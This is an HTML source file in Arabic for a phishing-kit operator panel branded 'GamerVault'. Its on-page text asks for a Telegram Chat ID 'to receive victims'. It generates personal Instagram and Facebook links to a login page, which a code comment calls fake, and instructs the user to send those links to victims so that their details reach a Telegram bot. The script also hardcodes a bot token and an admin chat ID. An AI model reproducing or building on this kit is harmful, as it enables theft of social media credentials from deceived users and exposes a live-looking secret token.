<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GamerVault Panel - لوحة التحكم</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: white; text-align: center; padding: 20px; }
        .container { max-width: 400px; margin: auto; background: #1e293b; padding: 20px; border-radius: 15px; border: 1px solid #334155; }
        h2 { color: #38bdf8; }
        .btn { display: block; width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; text-decoration: none; }
        .insta { background: #e1306c; color: white; }
        .fb { background: #1877f2; color: white; }
        .input-box { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #475569; background: #0f172a; color: white; box-sizing: border-box; }
        .link-box { background: #334155; padding: 10px; border-radius: 5px; word-break: break-all; margin-top: 10px; display: none; }
    </style>
</head>
<body>

<div class="container" id="auth">
    <h2>تسجيل الدخول / إنشاء حساب</h2>
    <p>أدخل Chat ID الخاص بك لاستلام الضحايا</p>
    <input type="text" id="userChatId" class="input-box" placeholder="أدخل Telegram Chat ID">
    <button class="btn fb" onclick="login()">دخول إلى اللوحة</button>
</div>

<div class="container" id="panel" style="display:none;">
    <h2>مرحباً بك في اللوحة 🚀</h2>
    <p>اختر نوع الصفحة لإنشاء رابط خاص بك:</p>
    <button class="btn insta" onclick="generateLink('Instagram')">رابط Instagram 📸</button>
    <button class="btn fb" onclick="generateLink('Facebook')">رابط Facebook 🔵</button>
    
    <div id="result" class="link-box">
        <p>رابطك الخاص هو:</p>
        <code id="finalLink"></code>
        <p style="font-size: 12px; color: #94a3b8; margin-top: 10px;">انسخ الرابط وأرسله للضحايا. المعلومات ستصلك في البوت.</p>
    </div>
</div>

<script>
    const MY_BOT_TOKEN = "8433106897:AAETCVZJn6d-sDFFBGUcbZesj1QLvvPuUo0";
    const ADMIN_CHAT_ID = "6168661664"; // تأكد من Chat ID ديالك هنا

    function login() {
        const id = document.getElementById('userChatId').value;
        if(id.length > 5) {
            localStorage.setItem('myChatId', id);
            document.getElementById('auth').style.display = 'none';
            document.getElementById('panel').style.display = 'block';
        } else { alert("أدخل ID صحيح"); }
    }

    function generateLink(type) {
        const userId = localStorage.getItem('myChatId');
        const currentUrl = window.location.href.replace('index.html', '');
        // هاد الرابط غايكون هو صفحة تسجيل الدخول المزورة
        const link = `${currentUrl}login.html?ref=${userId}&type=${type}`;
        document.getElementById('result').style.display = 'block';
        document.getElementById('finalLink').innerText = link;
    }
</script>
</body>
</html>
